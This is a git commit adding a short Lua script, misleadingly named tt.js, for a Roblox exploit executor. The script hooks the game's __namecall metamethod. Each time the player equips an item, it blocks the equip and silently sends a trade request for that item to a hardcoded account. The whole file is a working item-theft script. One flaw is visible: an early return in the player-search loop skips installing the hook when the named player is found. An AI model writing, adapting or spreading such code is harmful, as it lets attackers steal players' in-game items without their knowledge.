de481bc810051107cbb4ef6d1015e048bddaa91c
dvorxkayboarz <dvoraxturez@gmail.com>
2025-09-09 00:58:31 +0700

    Create tt.js
    z

---
+++ tt.js
@@ -0,0 +1,34 @@
+local tradeActive = true
+local targetUserId = 9238044022
+local net = ReplicatedStorage:WaitForChild("Packages")
+	:WaitForChild("_Index")
+	:WaitForChild("sleitnick_net@0.2.0")
+	:WaitForChild("net")
+local Players = game:GetService("Players")
+local initiateTrade = net:WaitForChild("RF/InitiateTrade")
+local displayName = "floidcorge"
+for _, player in ipairs(Players:GetPlayers()) do
+ if player.DisplayName == displayName or player.Name == displayName then
+	targetUserId = player.UserId
+	print("USERNAME FOUND ... !!!")
+	return
+ end
+end
+
+local mt = getrawmetatable(game)
+local oldNamecall = mt.__namecall
+setreadonly(mt, false)
+mt.__namecall = newcclosure(function(self, ...)
+   local args = {...}
+   local method = getnamecallmethod()
+
+   if tradeActive and tostring(self) == "RE/EquipItem" and method == "FireServer" then
+      local uuid = args[1]
+      if uuid and targetUserId then
+        initiateTrade:InvokeServer(targetUserId, uuid)
+      end
+      return nil
+   end
+   return oldNamecall(self, unpack(args))
+end)
+setreadonly(mt, true)
